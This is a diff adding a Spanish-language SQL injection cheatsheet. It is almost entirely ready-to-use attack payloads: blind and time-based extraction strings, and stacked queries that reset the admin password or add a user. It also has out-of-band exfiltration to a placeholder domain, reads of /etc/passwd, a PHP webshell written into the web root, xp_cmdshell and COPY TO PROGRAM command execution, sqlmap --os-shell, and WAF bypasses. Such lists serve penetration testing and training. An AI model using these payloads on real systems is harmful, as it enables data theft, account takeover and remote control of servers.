@@ -1,0 +1,104 @@
+=====================================================
+         SQL INJECTION - CHEATSHEET RAPIDO
+=====================================================
+
+=== BLIND SQLi (Boolean) ===
+
+Longitud:
+1' and length(database())=4 -- -
+1' and (select length(schema_name) from information_schema.schemata limit 0,1)=18 -- -
+
+Extraer caracter a caracter:
+1' and substring(database(),1,1)='d' -- -
+1' and substring((select schema_name from information_schema.schemata limit 2,1),1,1)='d' -- -
+
+Bypass comillas con ASCII:
+1 and ascii(substring(database(),1,1))=100 -- -
+
+
+=== TIME-BASED ===
+
+MySQL:    1' and sleep(5) -- -
+MSSQL:    1'; WAITFOR DELAY '00:00:05' -- -
+PostgreSQL: 1'; SELECT pg_sleep(5) -- -
+
+Condicional (mas eficiente):
+1' and IF(substring(database(),1,1)='d', sleep(5), 0) -- -
+
+Heavy query (si SLEEP filtrado):
+1' and BENCHMARK(10000000,MD5('A')) -- -
+
+
+=== STACKED QUERIES ===
+
+Funciona bien en: MSSQL
+Raro en: MySQL+PHP
+
+1; UPDATE users SET password='hacked' WHERE username='admin' -- -
+1; INSERT INTO users(user,pass) VALUES('hacker','123') -- -
+
+
+=== OUT-OF-BAND (OOB) ===
+
+MySQL via SMB:
+SELECT LOAD_FILE(concat('\\\\',database(),'.TUDOMINIO.com\\a'))
+
+MSSQL via DNS:
+EXEC('master.dbo.xp_dirtree "\\' + @data + '.TUDOMINIO.com\\x"')
+
+
+=== LEER ARCHIVOS ===
+
+MySQL:
+1' union select 1,load_file('/etc/passwd') -- -
+1' union select 1,load_file(0x2f6574632f706173737764) -- -
+
+MSSQL:
+SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x
+
+
+=== ESCRIBIR ARCHIVOS ===
+
+MySQL - Webshell:
+1' union select 1,'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php' -- -
+
+Hex (bypass comillas):
+1' union select 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e into outfile '/var/www/html/shell.php' -- -
+
+
+=== RCE ===
+
+MSSQL - xp_cmdshell:
+1; EXEC sp_configure 'show advanced options',1; RECONFIGURE -- -
+1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE -- -
+1; EXEC xp_cmdshell 'whoami' -- -
+
+PostgreSQL:
+1'; COPY (SELECT '') TO PROGRAM 'id' -- -
+
+
+=== FUNCIONES UTILES ===
+
+MySQL:  database() user() version() length() substring() ascii() sleep() load_file()
+MSSQL:  DB_NAME() USER_NAME() @@VERSION LEN() SUBSTRING() ASCII() WAITFOR DELAY
+PgSQL:  current_database() current_user version() length() substring() ascii() pg_sleep()
+
+
+=== SQLMAP RAPIDO ===
+
+sqlmap -u "URL?id=1" --dbs
+sqlmap -u "URL?id=1" --technique=B --dbs          # boolean
+sqlmap -u "URL?id=1" --technique=T --time-sec=5   # time
+sqlmap -u "URL?id=1" --file-read="/etc/passwd"
+sqlmap -u "URL?id=1" --os-shell
+sqlmap -u "URL?id=1" --tamper=space2comment
+
+
+=== BYPASS WAF ===
+
+Espacios:  /**/  %20  %09  +
+Case:      SeLeCt  UnIoN
+Inline:    UN/**/ION SE/**/LECT
+Hex:       0x61646d696e = 'admin'
+
+=====================================================
